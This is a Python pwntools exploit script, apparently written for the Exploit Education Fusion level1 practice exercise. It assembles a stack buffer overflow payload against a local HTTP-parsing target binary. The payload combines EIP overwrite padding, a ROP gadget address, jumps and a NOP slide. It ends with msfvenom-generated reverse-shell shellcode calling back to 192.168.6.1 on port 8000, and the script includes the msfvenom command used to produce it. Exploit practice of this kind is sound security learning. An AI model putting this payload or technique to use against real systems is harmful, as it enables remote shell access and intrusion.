import pwn
import sys


def main():
    executable_filepath = '/home/x90slide/exercises/exploit_education/fusion/level1/local/target'
    payload = assemble_payload()

    io = pwn.process([executable_filepath, payload])
    print(io.recvline())

    try: 
        final_reply = io.recvline()
        if b"trying to access" in final_reply:
            print('Saw final return message. Buffer was not overflown :(')
        else:
            print('ERROR: unexpected output in final reply:')
            print(final_reply)
    except EOFError as err:
        print('Did not see final return message. Buffer was probably successfully overflown (or the app otherwise crashed)')
        print('Check if you caught a reverse shell at 192.168.6.1 on port 8000!')
        io.interactive()


def assemble_payload():
    # Legitimate usage parameters
    method = b'GET'
    path = b'/'
    protocol = b'HTTP/1.1'

    # Exploit magic parameters
    bytes_from_path_to_stored_eip = 139
    rop_gadget_address = 0x0807c17c
    jump_length = 0x50 # The length of the jump we take into the nopslide

    jump_instruction = pwn.asm('jmp $+{}'.format(hex(jump_length)))

    # Modifying the path so it overflows the stored EIP
    gadget_address_packed = pwn.p32(rop_gadget_address)
    overflow_path = path
    ## This jump is hit after the we've returned from the gadget and after the second jump.
    overflow_path += b'A' * (bytes_from_path_to_stored_eip - len(jump_instruction))
    overflow_path += jump_instruction
    overflow_path += gadget_address_packed

    # This is where we return to after the gadget
    ## (Yes, we return to right after the gadget address)
    ## Jump over the HTTP/1.1 into a nopslide
    overflow_path += jump_instruction

    # Nopslide before the shellcode
    nopslide_length = jump_length
    nopslide = pwn.asm(pwn.shellcraft.nop()) * nopslide_length

    # Add the shellcode
    shellcode = get_reverse_shell_shellcode()


    # Putting all the pieces together
    ## Format:
    ## METHOD PATH PROTOCOL SHELLCODE
    payload = method
    payload += b' '
    payload += overflow_path
    payload += b' '
    payload += protocol
    payload += b' '
    payload += nopslide
    payload += shellcode

    print('Payload assembled:')
    print(payload)
    print('Payload in hex:')
    for i in payload: print('{}{}'.format('\\x', hex(i)[2:]), end='')
    print()

    return payload

def get_reverse_shell_shellcode():
    """Gets the reverse shell shellcode that was generated by msfvenom
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.6.1 LPORT=8000 -a x86 --platform linux -b '\x00\x2f' -f python
    """
    buf =  b""
    buf += b"\xbb\x44\xd1\x0d\x1d\xdd\xc7\xd9\x74\x24\xf4\x5d\x31"
    buf += b"\xc9\xb1\x12\x31\x5d\x12\x83\xc5\x04\x03\x19\xdf\xef"
    buf += b"\xe8\x90\x04\x18\xf1\x81\xf9\xb4\x9c\x27\x77\xdb\xd1"
    buf += b"\x41\x4a\x9c\x81\xd4\xe4\xa2\x68\x66\x4d\xa4\x8b\x0e"
    buf += b"\x8e\xfe\x6a\xcf\x66\xfd\x72\xd0\x36\x88\x92\x5e\xd0"
    buf += b"\xda\x05\xcd\xae\xd8\x2c\x10\x1d\x5e\x7c\xba\xf0\x70"
    buf += b"\xf2\x52\x65\xa0\xdb\xc0\x1c\x37\xc0\x56\x8c\xce\xe6"
    buf += b"\xe6\x39\x1c\x68"

    return buf

    

if __name__ == "__main__":
    main()
